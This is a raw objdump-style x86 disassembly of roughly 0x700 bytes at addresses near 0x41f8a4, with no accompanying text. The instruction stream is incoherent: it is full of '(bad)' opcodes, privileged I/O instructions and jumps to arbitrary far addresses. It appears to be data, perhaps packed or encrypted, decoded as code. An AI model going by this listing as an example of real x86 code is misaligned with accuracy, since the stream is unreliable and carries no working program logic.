  41f8a4:	cli    
  41f8a5:	call   0xb6888b03
  41f8aa:	sub    eax,DWORD PTR [esi]
  41f8ac:	outs   dx,DWORD PTR ds:[esi]
  41f8ad:	fistp  DWORD PTR [ecx+0x4f]
  41f8b0:	push   ds
  41f8b1:	dec    ebp
  41f8b2:	dec    ebx
  41f8b3:	adc    al,BYTE PTR [ebx+0x38]
  41f8b6:	inc    esi
  41f8b7:	and    eax,0xecbe21a2
  41f8bc:	xor    eax,0x546f6e74
  41f8c1:	jmp    0x5051a6d6
  41f8c6:	xchg   ebx,eax
  41f8c7:	sbb    eax,0xc6551f70
  41f8cc:	pminub mm3,mm3
  41f8cf:	and    DWORD PTR [eax+0x10],0xffffffaa
  41f8d3:	popf   
  41f8d4:	in     eax,0x47
  41f8d6:	das    
  41f8d7:	xchg   esp,eax
  41f8d8:	xor    DWORD PTR [edi-0x51372d17],esp
  41f8de:	std    
  41f8df:	popf   
  41f8e0:	scas   al,BYTE PTR es:[edi]
  41f8e1:	mov    eax,0xac43d1ff
  41f8e6:	ja     0x41f93e
  41f8e8:	ficom  WORD PTR [eax]
  41f8ea:	lods   eax,DWORD PTR ds:[esi]
  41f8eb:	sbb    DWORD PTR [ebp-0x2f],0xdc510baa
  41f8f2:	mov    ebx,0xb9033acf
  41f8f7:	push   ebp
  41f8f8:	fcom   DWORD PTR [ecx+0x62]
  41f8fb:	(bad)  
  41f8fc:	dec    edi
  41f8fd:	ficomp WORD PTR gs:[edi+0x1fd9a6c8]
  41f904:	xchg   ebp,eax
  41f905:	xor    DWORD PTR [ebp+0x71],ecx
  41f908:	cld    
  41f909:	ins    BYTE PTR es:[edi],dx
  41f90a:	lahf   
  41f90b:	push   DWORD PTR [ebp-0x76863098]
  41f911:	cmp    ch,BYTE PTR [ebp-0x168ed114]
  41f917:	(bad)  
  41f918:	jecxz  0x41f91c
  41f91a:	int3   
  41f91b:	xchg   esp,eax
  41f91c:	ss std 
  41f91e:	fwait
  41f91f:	jge    0x41f930
  41f921:	inc    esi
  41f922:	inc    edx
  41f923:	xor    ecx,DWORD PTR [edi]
  41f925:	xchg   DWORD PTR [esi+0x1c473724],edi
  41f92b:	call   0xca4e:0x1906de
  41f932:	sahf   
  41f933:	mov    ah,ch
  41f935:	adc    bl,BYTE PTR [ecx+0x39]
  41f938:	add    DWORD PTR [edx],0x1ed12a87
  41f93e:	repnz fldenv [ebp-0x66b39225]
  41f945:	push   ebp
  41f946:	xor    DWORD PTR [eax+eax*1+0x139dbf33],0x182916c6
  41f951:	mov    ch,0xa6
  41f953:	call   0xd9f8:0x8ad5591d
  41f95a:	mov    ch,0xfb
  41f95c:	retf   0x4fb6
  41f95f:	jno    0x41f90f
  41f961:	pop    ss
  41f962:	add    al,0xbb
  41f964:	add    eax,0x51f11a85
  41f969:	add    cl,al
  41f96b:	loope  0x41f96f
  41f96d:	ds and al,0x3a
  41f970:	xlat   BYTE PTR ds:[ebx]
  41f971:	call   0xc82db107
  41f976:	and    DWORD PTR [ecx-0x21],eax
  41f979:	xor    al,0x63
  41f97b:	dec    ebp
  41f97c:	(bad)  
  41f97d:	xor    DWORD PTR [esi+esi*1+0x3ff8471b],ebx
  41f984:	imul   ecx,DWORD PTR [ebp+0x34],0x7f
  41f988:	xchg   edi,eax
  41f989:	adc    eax,0x4006d905
  41f98e:	repz xor al,BYTE PTR [edi-0x6d]
  41f992:	loope  0x41f98e
  41f994:	xlat   BYTE PTR ds:[ebx]
  41f995:	cli    
  41f996:	imul   ebp,esi,0x9542700e
  41f99c:	pushf  
  41f99d:	jnp    0x41f9c6
  41f99f:	xor    al,0x5e
  41f9a1:	pusha  
  41f9a2:	mov    bh,0xed
  41f9a4:	pop    ebp
  41f9a5:	jg     0x41f98e
  41f9a7:	inc    ecx
  41f9a8:	push   edi
  41f9a9:	adc    eax,0x4a96a01a
  41f9ae:	mov    bl,BYTE PTR [ebp+0x47]
  41f9b1:	cmp    DWORD PTR [edi+edx*8-0x6ebf3745],edi
  41f9b8:	cmp    al,0x27
  41f9ba:	push   esp
  41f9bb:	dec    edi
  41f9bc:	dec    ebp
  41f9bd:	out    0x3,al
  41f9bf:	sbb    DWORD PTR [edx-0x43ab5f8e],0x84d89c11
  41f9c9:	(bad)  
  41f9ca:	rcl    BYTE PTR [ebp+0x3fa7ec57],1
  41f9d0:	scas   al,BYTE PTR es:[edi]
  41f9d1:	xchg   edi,eax
  41f9d2:	ficomp DWORD PTR [ecx-0x2b]
  41f9d5:	mov    ecx,0x63f8ad3b
  41f9da:	xchg   esp,eax
  41f9db:	aad    0xf3
  41f9dd:	mov    WORD PTR ds:0x73ba09b3,ss
  41f9e3:	pop    esp
  41f9e4:	pop    esi
  41f9e5:	jmp    0xcde5:0xc4246a04
  41f9ec:	das    
  41f9ed:	sbb    al,0x34
  41f9ef:	xor    al,0x14
  41f9f1:	jae    0x41f9b3
  41f9f3:	push   edi
  41f9f4:	push   0x32300914
  41f9f9:	imul   eax,DWORD PTR [eax-0x96e885c],0xfffffffa
  41fa00:	repz jnp 0x41fa66
  41fa03:	imul   BYTE PTR [edi]
  41fa05:	mov    al,0x29
  41fa07:	push   ecx
  41fa08:	jno    0x41f98b
  41fa0a:	inc    edi
  41fa0b:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  41fa0d:	jae    0x41fa07
  41fa0f:	and    eax,0xf577ecaa
  41fa14:	xchg   edi,eax
  41fa15:	add    al,0x8b
  41fa17:	sbb    eax,0x4dd27347
  41fa1c:	aad    0x7
  41fa1e:	mov    cl,BYTE PTR [edi+0x26eac2ff]
  41fa24:	in     al,0x51
  41fa26:	stos   DWORD PTR es:[edi],eax
  41fa27:	dec    esi
  41fa28:	(bad)  
  41fa29:	das    
  41fa2a:	push   edx
  41fa2b:	lods   eax,DWORD PTR ds:[esi]
  41fa2c:	push   ebx
  41fa2d:	dec    edi
  41fa2e:	into   
  41fa2f:	jp     0x4b964e5f
  41fa35:	ja     0x41fa90
  41fa37:	add    al,0xc9
  41fa39:	das    
  41fa3a:	jmp    FWORD PTR ds:0xe7edcfe4
  41fa40:	mov    ebx,0x97c139d8
  41fa45:	loopne 0x41fa8f
  41fa47:	jae    0x41f9fa
  41fa49:	pushf  
  41fa4a:	loope  0x41f9ea
  41fa4c:	ja     0x41fa7e
  41fa4e:	(bad)  [ecx+0x1b]
  41fa51:	lea    esi,[edx+0x9]
  41fa54:	mov    eax,edi
  41fa56:	shl    ch,cl
  41fa58:	mov    esp,0x60a3cecf
  41fa5d:	xor    al,0xfe
  41fa5f:	cmp    al,0x3d
  41fa61:	mov    ecx,0x1ddd52b4
  41fa66:	cmp    DWORD PTR [edx+0x5981bd41],ebp
  41fa6c:	xor    edi,esp
  41fa6e:	in     eax,0xe8
  41fa70:	hlt    
  41fa71:	mov    ch,0xa
  41fa73:	push   cs
  41fa74:	jb     0x41fa85
  41fa76:	xchg   edi,eax
  41fa77:	add    BYTE PTR [edi],0x33
  41fa7a:	mov    eax,ds:0x62829a01
  41fa7f:	mov    bl,0x82
  41fa81:	xchg   ebx,ecx
  41fa83:	mov    ecx,0xd7016f02
  41fa88:	je     0x41fb00
  41fa8a:	add    edi,eax
  41fa8c:	call   0x69e6287a
  41fa91:	sbb    al,0x54
  41fa93:	(bad)  
  41fa94:	xor    DWORD PTR [eax+0x4b],ebp
  41fa97:	or     ch,BYTE PTR [edx+0x27]
  41fa9a:	cli    
  41fa9b:	dec    edx
  41fa9c:	or     DWORD PTR [edi+0x1aab4267],esi
  41faa2:	jp     0x41fa25
  41faa4:	daa    
  41faa5:	pusha  
  41faa6:	jbe    0x41fab6
  41faa8:	push   eax
  41faa9:	mov    BYTE PTR ds:0x71b4bc9f,dl
  41faaf:	dec    bx
  41fab1:	adc    BYTE PTR [eax-0x77],ah
  41fab4:	sbb    DWORD PTR [ebp+0x73502771],0xffffffc0
  41fabb:	cmp    DWORD PTR [ebx+0xb],eax
  41fabe:	xchg   BYTE PTR [ebp+0x33917046],dh
  41fac4:	(bad)  
  41fac6:	or     edx,edx
  41fac8:	and    ecx,DWORD PTR [ebp-0x58]
  41facb:	mov    ah,0xd4
  41facd:	xchg   esi,eax
  41face:	pop    eax
  41facf:	call   0xbae5:0xbce4889c
  41fad6:	mov    bl,0xc1
  41fad8:	pop    ebp
  41fad9:	push   esp
  41fada:	icebp  
  41fadb:	dec    ecx
  41fadc:	jae    0x41fb32
  41fade:	enter  0x223a,0x86
  41fae2:	retf   
  41fae3:	adc    BYTE PTR [ebx+0x3b2ad899],ch
  41fae9:	sbb    eax,0x69c31b19
  41faee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41faef:	push   ebx
  41faf0:	push   esp
  41faf1:	pusha  
  41faf2:	scas   ax,WORD PTR es:[edi]
  41faf4:	inc    esi
  41faf5:	scas   al,BYTE PTR es:[edi]
  41faf6:	mov    esi,0xbb094a3c
  41fafb:	ds cmc 
  41fafd:	sub    dh,dl
  41faff:	(bad)  
  41fb00:	scas   eax,DWORD PTR es:[edi]
  41fb01:	and    eax,0x40dcc1a4
  41fb06:	fistp  DWORD PTR [eax-0x6f54ba44]
  41fb0c:	push   esp
  41fb0d:	dec    ebp
  41fb0e:	lods   eax,DWORD PTR ds:[esi]
  41fb0f:	retf   
  41fb10:	cdq    
  41fb11:	(bad)  
  41fb12:	stos   DWORD PTR es:[edi],eax
  41fb13:	inc    edx
  41fb14:	cmc    
  41fb15:	sub    ah,dl
  41fb17:	imul   eax,DWORD PTR [edi+0x7ca32b0c],0x440baa3a
  41fb21:	fmul   QWORD PTR [eax+0x6d]
  41fb24:	int    0xa0
  41fb26:	bound  ecx,QWORD PTR [ebx]
  41fb28:	fwait
  41fb29:	pop    edi
  41fb2a:	popf   
  41fb2b:	xor    DWORD PTR [edi-0x63],ebx
  41fb2e:	pop    ds
  41fb2f:	mov    al,0x25
  41fb31:	pop    es
  41fb32:	hlt    
  41fb33:	int3   
  41fb34:	scas   eax,DWORD PTR es:[edi]
  41fb35:	pop    ecx
  41fb36:	dec    edx
  41fb37:	and    al,0x2b
  41fb39:	cmp    al,0xa5
  41fb3b:	shr    edx,cl
  41fb3d:	dec    esp
  41fb3e:	jno    0x41fb5b
  41fb40:	inc    ebx
  41fb41:	rcl    BYTE PTR [ebp+0x4c],cl
  41fb44:	fnsave [edi-0x2d577a6d]
  41fb4a:	mov    ebx,0x79acd561
  41fb4f:	leave  
  41fb50:	in     al,dx
  41fb51:	scas   eax,DWORD PTR es:[edi]
  41fb52:	call   0x4655:0x31e642a
  41fb59:	xchg   ecx,eax
  41fb5a:	fdiv   QWORD PTR [edi+0x67]
  41fb5d:	shl    DWORD PTR [ecx],1
  41fb5f:	call   0x2e9340e6
  41fb64:	cmc    
  41fb65:	adc    BYTE PTR [edx-0x179b57a3],al
  41fb6b:	mov    ds:0x53aaa4c9,eax
  41fb70:	(bad)  
  41fb71:	jp     0x41fb04
  41fb73:	sub    DWORD PTR [ecx+0x1fa4e6e1],ecx
  41fb79:	xor    DWORD PTR [ebx+0x3a85fe61],edi
  41fb7f:	aad    0x96
  41fb81:	lock mov BYTE PTR [ebx+0x58],ah
  41fb85:	pop    ebp
  41fb86:	dec    edi
  41fb87:	jmp    0x41fb9c
  41fb89:	icebp  
  41fb8a:	mov    WORD PTR [eax+edi*1+0x3f],ds
  41fb8e:	mov    DWORD PTR [ecx-0x491193b2],ebx
  41fb94:	gs jl  0x41fb24
  41fb97:	sub    DWORD PTR [eax-0x7d],esp
  41fb9a:	cld    
  41fb9b:	popf   
  41fb9c:	jle    0x41fbbd
  41fb9e:	mov    ch,0x3
  41fba0:	push   0x97767dde
  41fba5:	sbb    eax,0xbd05c707
  41fbaa:	sar    DWORD PTR [esi-0x4f],0xa8
  41fbae:	jbe    0x41fbe6
  41fbb0:	aam    0x1c
  41fbb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fbb3:	or     BYTE PTR [edi],0x1a
  41fbb6:	aaa    
  41fbb7:	mov    cl,0xbe
  41fbb9:	mov    cl,BYTE PTR [edx]
  41fbbb:	mov    eax,0xe306127e
  41fbc0:	inc    esp
  41fbc1:	icebp  
  41fbc2:	out    dx,al
  41fbc3:	cwde   
  41fbc4:	cdq    
  41fbc5:	jo     0x41fbd8
  41fbc7:	sbb    al,0x10
  41fbc9:	adc    BYTE PTR [eax],cl
  41fbcb:	inc    ecx
  41fbcc:	fist   WORD PTR [ecx-0xf]
  41fbcf:	adc    BYTE PTR [edx],0xe8
  41fbd2:	add    bh,ch
  41fbd4:	call   0x7297d45d
  41fbd9:	jge    0x41fbbb
  41fbdb:	xchg   BYTE PTR [eax+ecx*2-0x18],ah
  41fbdf:	es pusha 
  41fbe1:	cmp    DWORD PTR [eax],ebx
  41fbe3:	loop   0x41fbde
  41fbe5:	ins    BYTE PTR es:[edi],dx
  41fbe6:	sbb    ecx,DWORD PTR [edx+0x25]
  41fbe9:	mov    cl,BYTE PTR [ecx-0x36]
  41fbec:	das    
  41fbed:	or     DWORD PTR [esi+0x2ac449f],0xffffff80
  41fbf4:	icebp  
  41fbf5:	into   
  41fbf6:	pop    ebx
  41fbf7:	xchg   ecx,eax
  41fbf8:	hlt    
  41fbf9:	dec    ebp
  41fbfa:	arpl   WORD PTR [ecx],di
  41fbfc:	xchg   BYTE PTR ds:0xfa82559e,ch
  41fc02:	fst    st(2)
  41fc04:	mov    DWORD PTR [esi],eax
  41fc06:	mov    DWORD PTR [ecx],0x3893bfe7
  41fc0c:	mov    bl,0x74
  41fc0e:	(bad)  
  41fc10:	scas   al,BYTE PTR es:[edi]
  41fc11:	mov    DWORD PTR [ebp-0x31],eax
  41fc14:	xchg   ebp,eax
  41fc15:	jl     0x41fc71
  41fc17:	loope  0x41fbcd
  41fc19:	in     al,0x90
  41fc1b:	fist   DWORD PTR [ebp+0x16fcfa11]
  41fc21:	loope  0x41fbf1
  41fc23:	sahf   
  41fc24:	add    BYTE PTR [ecx+0x61],cl
  41fc27:	push   esp
  41fc28:	or     BYTE PTR [ebx],bl
  41fc2a:	in     al,dx
  41fc2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc2c:	and    al,0x54
  41fc2e:	mov    eax,ds:0x5aa19238
  41fc33:	ror    DWORD PTR [esi+0x3b],1
  41fc36:	sbb    DWORD PTR [ecx+0x5c40c256],esp
  41fc3c:	mov    al,ds:0xb700f0a0
  41fc41:	pop    es
  41fc42:	jno    0x41fc29
  41fc44:	jecxz  0x41fc3a
  41fc46:	pop    edx
  41fc47:	pop    ss
  41fc48:	inc    esp
  41fc49:	test   BYTE PTR [esi+0x79587b56],ch
  41fc4f:	inc    edx
  41fc50:	(bad)  
  41fc51:	in     eax,dx
  41fc52:	add    cl,BYTE PTR [eax-0x2c]
  41fc55:	inc    ebx
  41fc56:	inc    esi
  41fc57:	(bad)  
  41fc58:	mov    dl,BYTE PTR es:0x2c2b0b21
  41fc5f:	or     DWORD PTR ds:0x1661ac6b,esp
  41fc65:	push   esp
  41fc66:	pop    ds
  41fc67:	push   cs
  41fc68:	(bad)  
  41fc69:	cmp    DWORD PTR [esi-0x557124dc],eax
  41fc6f:	scas   al,BYTE PTR es:[edi]
  41fc70:	push   esp
  41fc71:	nop
  41fc72:	pop    esp
  41fc73:	call   eax
  41fc75:	cmp    eax,0x23c23571
  41fc7a:	and    al,0x99
  41fc7c:	pushf  
  41fc7d:	push   eax
  41fc7e:	into   
  41fc7f:	out    dx,al
  41fc80:	push   es
  41fc81:	push   esi
  41fc82:	clc    
  41fc83:	push   esp
  41fc84:	sti    
  41fc85:	nop
  41fc86:	es push edx
  41fc88:	sti    
  41fc89:	inc    ecx
  41fc8a:	dec    edi
  41fc8b:	loope  0x41fc8b
  41fc8d:	mov    al,0xe3
  41fc8f:	inc    ebx
  41fc90:	inc    edx
  41fc91:	xor    esi,DWORD PTR [ebp+0x2c]
  41fc94:	xlat   BYTE PTR ds:[bx]
  41fc96:	cmc    
  41fc97:	ror    bl,cl
  41fc99:	inc    ebx
  41fc9a:	inc    edi
  41fc9b:	sub    dl,BYTE PTR [esi-0x1b]
  41fc9e:	out    dx,eax
  41fc9f:	add    dl,ch
  41fca1:	push   ecx
  41fca2:	leave  
  41fca3:	fild   DWORD PTR [esi-0x60973412]
  41fca9:	scas   eax,DWORD PTR es:[edi]
  41fcaa:	pop    edi
  41fcab:	push   es
  41fcac:	ds mov ch,0xb1
  41fcaf:	inc    eax
  41fcb0:	ror    DWORD PTR [ecx-0x20e274c8],1
  41fcb6:	inc    ebx
  41fcb7:	rcr    DWORD PTR [ecx+0x3c],0xca
  41fcbb:	pop    ebp
  41fcbc:	fistp  QWORD PTR [edx+0x431ed9f1]
  41fcc2:	into   
  41fcc3:	out    0xbb,al
  41fcc5:	fwait
  41fcc6:	leave  
  41fcc7:	mov    esi,0x9de6b256
  41fccc:	mov    ch,0x12
  41fcce:	cmp    eax,0x76
  41fcd1:	jp     0x41fcb0
  41fcd3:	test   al,0xdc
  41fcd5:	or     al,0x5d
  41fcd7:	aas    
  41fcd8:	arpl   WORD PTR [ebp-0x2],bx
  41fcdb:	pop    ebx
  41fcdc:	dec    esi
  41fcdd:	ins    BYTE PTR es:[edi],dx
  41fcde:	adc    eax,0x1720dfe0
  41fce3:	push   edx
  41fce4:	retf   0x2e13
  41fce7:	xor    esp,DWORD PTR [edx+0x63]
  41fcea:	fisubr WORD PTR [eax+0x446824ab]
  41fcf0:	add    eax,0x2c003e
  41fcf5:	pop    edx
  41fcf6:	fwait
  41fcf7:	loopne 0x41fc7e
  41fcf9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fcfa:	mov    eax,ds:0xe81c90c6
  41fcff:	addr16 and ebx,eax
  41fd02:	in     eax,dx
  41fd03:	cs jg  0x41fc8d
  41fd06:	jmp    0x41fd37
  41fd08:	xor    eax,0x6e032245
  41fd0d:	dec    ecx
  41fd0e:	cwde   
  41fd0f:	or     eax,0x90a0a01
  41fd14:	repnz stos BYTE PTR es:[edi],al
  41fd16:	push   ebp
  41fd17:	push   ds
  41fd18:	push   0xfffffff4
  41fd1a:	cmp    al,0xd
  41fd1c:	iret   
  41fd1d:	(bad)  
  41fd1e:	cmc    
  41fd1f:	lock aas 
  41fd21:	stos   BYTE PTR es:[edi],al
  41fd22:	arpl   WORD PTR [eax+0x1b],bx
  41fd25:	outs   dx,DWORD PTR ds:[esi]
  41fd26:	push   esp
  41fd27:	sbb    al,0xe
  41fd29:	jmp    0xbc48:0xde26b7c0
  41fd30:	inc    esi
  41fd31:	xchg   DWORD PTR [ecx],ebx
  41fd33:	adc    ah,BYTE PTR [esp+edx*8-0x51ec0bb2]
  41fd3a:	(bad)  
  41fd3b:	xchg   esp,eax
  41fd3c:	xchg   edi,eax
  41fd3d:	inc    ebx
  41fd3e:	lock loopne 0x41fd95
  41fd41:	add    ax,0x92a7
  41fd45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd46:	xchg   esi,eax
  41fd47:	jbe    0x41fd39
  41fd49:	push   esp
  41fd4a:	iret   
  41fd4b:	dec    esp
  41fd4c:	out    0x68,al
  41fd4e:	pop    ds
  41fd4f:	and    DWORD PTR [ebx+0x9],esi
  41fd52:	jns    0x41fd84
  41fd54:	mov    dh,0x21
  41fd56:	xor    BYTE PTR [eax+0x5c],ah
  41fd59:	inc    edx
  41fd5a:	sbb    bl,BYTE PTR [ebp+0x17]
  41fd5d:	dec    esp
  41fd5e:	retf   0x98a0
  41fd61:	mov    ah,0x32
  41fd63:	add    eax,0x99d8c471
  41fd68:	sbb    edi,DWORD PTR [ecx-0x9]
  41fd6b:	inc    esp
  41fd6c:	clc    
  41fd6d:	pop    edx
  41fd6e:	(bad)  
  41fd6f:	jb     0x41fddc
  41fd71:	sbb    dh,BYTE PTR [edx*2-0x7eec653f]
  41fd78:	xor    ebx,ecx
  41fd7a:	mov    ebp,0xb1661fcc
  41fd7f:	ds nop
  41fd81:	enter  0x1817,0xc3
  41fd85:	inc    ebx
  41fd86:	add    BYTE PTR [ebx-0x33],bl
  41fd89:	push   ds
  41fd8a:	mov    ds:0x32f21f5c,eax
  41fd8f:	jne    0x41fe0d
  41fd91:	mov    ecx,0x9ab936a1
  41fd96:	test   DWORD PTR [edx+0x392d29a6],0x76685207
  41fda0:	outs   dx,DWORD PTR ds:[esi]
  41fda1:	test   eax,0x52dac1fc
  41fda6:	push   esi
  41fda7:	or     al,0x10
  41fda9:	dec    DWORD PTR [edi+eiz*2+0x6247962]
  41fdb0:	xchg   edi,eax
  41fdb1:	repnz inc ecx
  41fdb3:	xchg   edx,eax
  41fdb4:	inc    ebp
  41fdb5:	sub    al,0x95
  41fdb7:	popa   
  41fdb8:	sbb    ebp,DWORD PTR [ecx+0x39]
  41fdbb:	adc    edx,DWORD PTR [edi+0x1f]
  41fdbe:	add    DWORD PTR [edx+ebx*1+0x4c],ecx
  41fdc2:	(bad)  
  41fdc3:	in     al,dx
  41fdc4:	add    edx,edx
  41fdc6:	xor    DWORD PTR ds:0xb29e90f3,0xffffffbc
  41fdcd:	std    
  41fdce:	mov    BYTE PTR [ebx-0x2d683850],dl
  41fdd4:	dec    ebp
  41fdd5:	icebp  
  41fdd6:	and    al,0xbb
  41fdd8:	jo     0x41fdf5
  41fdda:	ret    
  41fddb:	pop    esp
  41fddc:	out    0xe8,al
  41fdde:	lods   al,BYTE PTR ds:[esi]
  41fddf:	xchg   esi,eax
  41fde0:	into   
  41fde1:	fild   WORD PTR [esp+ecx*4+0x28]
  41fde5:	call   0x53b1352c
  41fdea:	test   ebp,0x44a436cb
  41fdf0:	or     DWORD PTR [ecx],ebx
  41fdf2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fdf3:	dec    edi
  41fdf4:	mov    cl,0x6c
  41fdf6:	mov    edx,0xc23c4068
  41fdfb:	lea    esp,[eax+eax*1+0x78eabe6]
  41fe02:	scas   eax,DWORD PTR es:[edi]
  41fe03:	or     dl,BYTE PTR [eax-0x7b]
  41fe06:	pusha  
  41fe07:	imul   DWORD PTR [ecx]
  41fe09:	call   0xf4bb2464
  41fe0e:	outs   dx,BYTE PTR ds:[esi]
  41fe0f:	mov    al,ds:0xa8c4e678
  41fe14:	mov    al,0xa
  41fe16:	popf   
  41fe17:	out    dx,al
  41fe18:	pop    edi
  41fe19:	mov    ds,WORD PTR [ebx+0x7e780df9]
  41fe1f:	mov    esp,0x16c8d726
  41fe24:	call   0x36ed4917
  41fe29:	fild   QWORD PTR [edi]
  41fe2b:	lods   eax,DWORD PTR ds:[esi]
  41fe2c:	xlat   BYTE PTR ds:[ebx]
  41fe2d:	mov    ebp,0x207ca8fb
  41fe32:	cdq    
  41fe33:	outs   dx,DWORD PTR ds:[esi]
  41fe34:	mov    eax,edi
  41fe36:	icebp  
  41fe37:	jns    0x41fe11
  41fe39:	push   edi
  41fe3a:	call   0xbfea202a
  41fe3f:	mov    ch,0xc7
  41fe41:	cmp    bh,dh
  41fe43:	xor    DWORD PTR [esi],esi
  41fe45:	xor    esp,DWORD PTR [ebp-0x56]
  41fe48:	jns    0x41fe76
  41fe4a:	sub    eax,0x7da7b612
  41fe4f:	or     al,0x46
  41fe51:	or     al,0x5d
  41fe53:	push   0xffffffe7
  41fe55:	in     al,dx
  41fe56:	adc    esp,DWORD PTR [esi]
  41fe58:	aas    
  41fe59:	es jns 0x41fece
  41fe5c:	xlat   BYTE PTR ds:[ebx]
  41fe5d:	rol    BYTE PTR [edi+0x65],1
  41fe60:	inc    edi
  41fe61:	jne    0x41fdfc
  41fe63:	sbb    DWORD PTR ds:0x50d1d475,ecx
  41fe69:	pop    es
  41fe6a:	cmp    DWORD PTR [eax+0x36],esi
  41fe6d:	shl    DWORD PTR [edx+0x2fe1ae1b],0x3d
  41fe74:	sub    al,0xc1
  41fe76:	(bad)  
  41fe77:	call   0xe5d7fd21
  41fe7c:	retf   0xdfca
  41fe7f:	xchg   esp,eax
  41fe80:	push   es
  41fe81:	cmp    cl,BYTE PTR [ebp-0x626d3e7a]
  41fe87:	retf   
  41fe88:	dec    ebx
  41fe89:	imul   esp,DWORD PTR [edi],0xa144ad0a
  41fe8f:	mov    dh,0x23
  41fe91:	fwait
  41fe92:	int    0x6
  41fe94:	sti    
  41fe95:	push   0x18
  41fe97:	jp     0x41fee8
  41fe99:	jbe    0x41feec
  41fe9b:	xchg   esp,eax
  41fe9c:	aas    
  41fe9d:	(bad)  
  41fe9e:	scas   al,BYTE PTR es:[edi]
  41fe9f:	shr    bl,0x37
  41fea2:	leave  
  41fea3:	cmp    DWORD PTR [edi+esi*8-0x4e],0x15f89d23
  41feab:	inc    esp
  41feac:	loop   0x41fe68
  41feae:	push   esi
  41feaf:	aaa    
  41feb0:	inc    edx
  41feb1:	inc    esi
  41feb2:	daa    
  41feb3:	inc    edx
  41feb4:	cld    
  41feb5:	int    0xfe
  41feb7:	hlt    
  41feb8:	push   edi
  41feb9:	add    bh,BYTE PTR [ecx-0x1a]
  41febc:	or     edi,DWORD PTR [ecx-0x6643cdf0]
  41fec2:	leave  
  41fec3:	sbb    ebx,DWORD PTR [edx-0x52fae054]
  41fec9:	bound  esi,QWORD PTR [ebp+0x0]
  41fecc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fecd:	bound  eax,QWORD PTR [edx+edi*4-0x80]
  41fed1:	cmp    DWORD PTR [esp+ebp*2],edi
  41fed4:	gs (bad) 
  41fed6:	jae    0x41ff53
  41fed8:	retf   
  41fed9:	cdq    
  41feda:	xchg   BYTE PTR [ebp+0x48],bh
  41fedd:	jne    0x41fe61
  41fedf:	iret   
  41fee0:	jae    0x41ff38
  41fee2:	mov    al,ds:0xea31bcf5
  41fee7:	jle    0x41ff52
  41fee9:	jge    0x41fecd
  41feeb:	hlt    
  41feec:	icebp  
  41feed:	ins    BYTE PTR es:[edi],dx
  41feee:	jae    0x41ff12
  41fef0:	add    DWORD PTR [ebx],ebx
  41fef2:	stc    
  41fef3:	mov    edi,0x9de2deb0
  41fef8:	pop    DWORD PTR [bx-0x52]
  41fefc:	arpl   WORD PTR [edi+0x415c4e36],di
  41ff02:	or     al,BYTE PTR ds:0x572cdf61
  41ff08:	fucom  st(2)
  41ff0a:	jo     0x41ff2b
  41ff0c:	and    bl,dh
  41ff0e:	pop    es
  41ff0f:	mov    al,0x1e
  41ff11:	ror    ah,1
  41ff13:	pop    ecx
  41ff14:	data16 rol BYTE PTR [eax+0x1cb05340],cl
  41ff1b:	mov    dl,0x3d
  41ff1d:	push   ecx
  41ff1e:	mov    eax,ds:0xde7b38a5
  41ff23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ff24:	cmp    al,0x41
  41ff26:	sbb    al,0x3b
  41ff28:	mov    dl,0x2e
  41ff2a:	mov    al,bh
  41ff2c:	xchg   ch,dl
  41ff2e:	jge    0x41ff0d
  41ff30:	jb     0x41fec7
  41ff32:	pop    edx
  41ff33:	rol    BYTE PTR [ebx+0x66bd3b74],1
  41ff39:	nop
  41ff3a:	sub    edx,DWORD PTR ds:0xf027cb77
  41ff40:	psadbw mm0,QWORD PTR [edi]
  41ff43:	ja     0x41ff08
  41ff45:	dec    ebp
  41ff46:	sub    esi,ecx
  41ff48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ff49:	mov    esp,0x416aa6f2
  41ff4e:	inc    edi
  41ff4f:	fdiv   DWORD PTR [esi+0x637d4d3f]
  41ff55:	add    BYTE PTR [esi],ch
  41ff57:	adc    bh,BYTE PTR [ebx+edx*4+0x36]
  41ff5b:	clc    
  41ff5c:	lods   eax,DWORD PTR ds:[esi]
  41ff5d:	fadd   DWORD PTR [ebx+0x6cd5614e]
  41ff63:	outs   dx,DWORD PTR ds:[esi]
  41ff64:	jecxz  0x41ff67
  41ff66:	mov    dl,0x1
  41ff68:	std    
  41ff69:	or     cl,ch
  41ff6b:	cmp    BYTE PTR [ecx],bh
  41ff6d:	push   edx
  41ff6e:	mov    ?,WORD PTR [esi]
  41ff70:	jg     0x41ff5a
  41ff72:	sar    bh,0xdd
  41ff75:	add    BYTE PTR [esi+eiz*4],ah
  41ff78:	cmp    eax,0x106f9f03
  41ff7d:	xor    ebp,DWORD PTR [eax]
  41ff7f:	pushf  
  41ff80:	add    edx,DWORD PTR [ecx-0x44ca0038]
  41ff86:	jmp    0x41ff2b
  41ff88:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  41ff8a:	and    eax,0x7780a8c9
  41ff8f:	icebp  
  41ff90:	inc    ebx
  41ff91:	and    DWORD PTR [edx+0x45fae475],edi
  41ff97:	test   eax,0x12fa1de
  41ff9c:	lds    edi,FWORD PTR [ecx-0x7e96f40b]
  41ffa2:	shl    BYTE PTR [ebx],cl
  41ffa4:	pop    es
  41ffa5:	push   0x62195f37
  41ffaa:	(bad)  
  41ffab:	push   edi
  41ffac:	leave  
  41ffad:	jmp    0x662e1299
  41ffb2:	mov    ecx,0x25630c1a
  41ffb7:	adc    eax,0x421ec70b
  41ffbc:	inc    edx
  41ffbd:	out    0x11,al
  41ffbf:	out    dx,eax
  41ffc0:	aaa    
  41ffc1:	mov    cl,0x93
  41ffc3:	loopne 0x41ff66
  41ffc5:	dec    esi
  41ffc6:	pushf  
  41ffc7:	sbb    BYTE PTR [edi],al
  41ffc9:	xchg   DWORD PTR [ecx-0x71],esi
  41ffcc:	and    al,0xdb
  41ffce:	pushf  
  41ffcf:	jecxz  0x42004e
  41ffd1:	jle    0x41ff98
  41ffd3:	das    
  41ffd4:	or     dh,BYTE PTR [eax+0x4b1c5cf4]
  41ffda:	and    eax,0x43f01e43
  41ffdf:	mov    esp,0xb27f7c91
